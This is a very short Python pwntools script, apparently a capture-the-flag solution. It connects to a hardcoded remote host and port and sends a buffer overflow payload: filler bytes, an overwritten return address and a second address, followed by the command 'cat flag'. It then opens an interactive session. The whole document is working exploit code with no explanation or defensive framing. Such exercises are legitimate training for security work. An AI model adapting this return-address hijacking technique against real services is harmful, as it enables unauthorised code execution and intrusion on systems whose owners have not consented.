from pwn import *

proc = remote("109.233.56.90", 11602)
proc.send(b"a"*8+p64(0x00401162)+p64(0x4040a8)+b"cat flag")
proc.interactive()
